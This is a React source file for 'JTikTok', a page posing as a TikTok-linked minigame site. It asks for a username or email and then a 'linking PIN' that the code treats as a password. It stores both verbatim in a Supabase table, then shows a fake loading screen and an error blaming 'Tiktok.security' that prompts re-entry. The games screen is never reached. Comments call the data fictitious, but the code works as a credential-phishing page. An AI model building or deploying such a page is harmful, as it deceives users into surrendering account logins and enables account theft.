import { useEffect, useState } from "react";
import "./App.css";
import { supabase } from "./lib/supabase";

type Screen =
  | "welcome"
  | "username"
  | "verify"
  | "loading"
  | "error"
  | "home";

function App() {
  const [screen, setScreen] = useState<Screen>("welcome");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  function handleUsername(value: string) {
    // Permitimos letras, números, espacios, símbolos,
    // caracteres especiales, ñ, tildes, etc.
    setUsername(value.slice(0, 50));
    setMessage("");
  }

  function handlePassword(value: string) {
    // Dato ficticio usado únicamente para probar la interfaz y Supabase.
    setPassword(value.slice(0, 50));
    setMessage("");
  }

  async function sendUsername() {
    if (!username.trim()) {
      setMessage("Ingresa un nombre de usuario de prueba.");
      return;
    }

    setLoading(true);
    setMessage("");

    const { error } = await supabase
      .from("demo_events")
      .insert({
        event_type: "username_test",

        // Se guarda exactamente lo escrito por el usuario.
        test_identifier: username,
      });

    console.log("SUPABASE USERNAME ERROR:", error);

    setLoading(false);

    if (error) {
      setMessage("Error al guardar en la base de datos.");
      return;
    }

    setScreen("verify");
  }

  async function enterPassword() {
    if (!password) {
      setMessage("Ingresa un dato de prueba.");
      return;
    }

    setLoading(true);
    setMessage("");

    /*
      Este es un valor ficticio de demostración.
      Se guarda exactamente como fue escrito para probar Supabase.
    */

    const { error } = await supabase
      .from("demo_events")
      .insert({
        event_type: "demo_password",
        test_identifier: username,
        demo_value: password,
      });

    console.log(
      "SUPABASE PASSWORD STEP ERROR:",
      error
    );

    setLoading(false);

    if (error) {
      setMessage("Error al guardar la prueba.");
      return;
    }

    setScreen("loading");
  }

  useEffect(() => {
    if (screen !== "loading") {
      return;
    }

    const timer = window.setTimeout(() => {
      setScreen("error");
    }, 5000);

    return () => {
      window.clearTimeout(timer);
    };
  }, [screen]);

  return (
    <main className="app">

      {/* =========================
          BIENVENIDA
      ========================= */}

      {screen === "welcome" && (
        <section className="authCard welcomeCard">

          <div className="mainLogo">
            ♪
          </div>

          <h1>
            JTikTok
          </h1>

          <h2>
            Bienvenido
          </h2>

          <p className="description">
            Juega minijuegos rápidos directamente
            desde tu navegador.
          </p>

          <button
            className="mainButton"
            onClick={() =>
              setScreen("username")
            }
          >
            ♪ Continuar
          </button>

          <span className="version">
            Versión de prueba
          </span>

        </section>
      )}

      {/* =========================
          USUARIO
      ========================= */}

      {screen === "username" && (
        <section className="authCard">

          <button
            className="backButton"
            onClick={() =>
              setScreen("welcome")
            }
          >
            ←
          </button>

          <div className="smallLogo">
            ♪
          </div>

          <h2 className="screenTitle">
            vincular cuenta
          </h2>

          <p className="description left">
            Ingresa un nombre de usuario o correo.
          </p>

          <div className="usernameContainer">

            <div className="usernamePrefix">
              @
            </div>

            <input
              type="text"
              autoComplete="off"
              spellCheck={false}
              value={username}
              onChange={(e) =>
                handleUsername(
                  e.target.value
                )
              }
              placeholder="nombre o correo de prueba"
            />

          </div>

          <div className="counter">
            {username.length}/50
          </div>

          {message && (
            <p className="statusMessage">
              {message}
            </p>
          )}

          <button
            className="mainButton"
            onClick={sendUsername}
            disabled={
              !username.trim() ||
              loading
            }
          >
            {loading
              ? "Guardando..."
              : "Continuar"}
          </button>

        </section>
      )}

      {/* =========================
          CONTRASEÑA DE PRUEBA
      ========================= */}

      {screen === "verify" && (
        <section className="authCard">

          <button
            className="backButton"
            onClick={() =>
              setScreen("username")
            }
          >
            ←
          </button>

          <div className="spinner" />

          <h2 className="screenTitle">
            paso 2
          </h2>

          <p className="description left">
            pin de vinculación
          </p>

          <input
            className="codeInput"
            type="text"
            autoComplete="off"
            spellCheck={false}
            value={password}
            onChange={(e) =>
              handlePassword(
                e.target.value
              )
            }
            placeholder="00000"
          />

          {message && (
            <p className="statusMessage">
              {message}
            </p>
          )}

          <button
            className="mainButton"
            onClick={enterPassword}
            disabled={
              !password ||
              loading
            }
          >
            {loading
              ? "Guardando..."
              : "Continuar"}
          </button>

        </section>
      )}

      {/* =========================
          CARGA
      ========================= */}

      {screen === "loading" && (
        <section className="authCard loadingCard">

          <div className="bigSpinner" />

          <h2>
            Verificando prueba...
          </h2>

          <p className="description">
            Espera un momento.
          </p>

        </section>
      )}

      {/* =========================
          ERROR DE PRUEBA
      ========================= */}

      {screen === "error" && (
        <section className="authCard errorCard">

          <div className="errorIcon">
            !
          </div>

          <h2>
            Hubo un error
          </h2>

          <p className="description">
            nombre o contraseña no confirmadas por Tiktok.security. intenta de nuevo
          </p>

          <button
            className="mainButton"
            onClick={() => {
              setPassword("");
              setMessage("");
              setScreen("verify");
            }}
          >
            Volver a la contraseña
          </button>

        </section>
      )}

      {/* =========================
          HOME
      ========================= */}

      {screen === "home" && (
        <section className="homePage">

          <header className="header">

            <div className="brand">
              <span>
                ♪
              </span>

              JTikTok
            </div>

            <div className="userBadge">
              @{username}
            </div>

          </header>

          <div className="homeContent">

            <div className="hero">

              <span className="sectionLabel">
                JUEGOS
              </span>

              <h1>
                Elige un juego
              </h1>

              <p>
                Minijuegos de prueba.
              </p>

            </div>

            <div className="gamesGrid">

              {/* JUMP UP */}

              <button
                className="gameCard"
                onClick={() =>
                  alert(
                    "Juego de prueba"
                  )
                }
              >

                <div className="gamePreview jump">

                  <div className="previewBall" />

                  <div className="platform p1" />

                  <div className="platform p2" />

                  <div className="platform p3" />

                </div>

                <div className="gameInfo">

                  <h3>
                    Jump Up
                  </h3>

                  <p>
                    Salta entre plataformas.
                  </p>

                  <span>
                    Abrir →
                  </span>

                </div>

              </button>

              {/* MINETAP */}

              <button
                className="gameCard"
                onClick={() =>
                  alert(
                    "Juego de prueba"
                  )
                }
              >

                <div className="gamePreview mine">

                  <div className="mineGrid">

                    <span>1</span>
                    <span></span>
                    <span>💣</span>

                    <span></span>
                    <span>2</span>
                    <span></span>

                    <span>1</span>
                    <span></span>
                    <span>1</span>

                  </div>

                </div>

                <div className="gameInfo">

                  <h3>
                    MineTap
                  </h3>

                  <p>
                    Encuentra las casillas seguras.
                  </p>

                  <span>
                    Abrir →
                  </span>

                </div>

              </button>

            </div>

          </div>

        </section>
      )}

    </main>
  );
}

export default App;
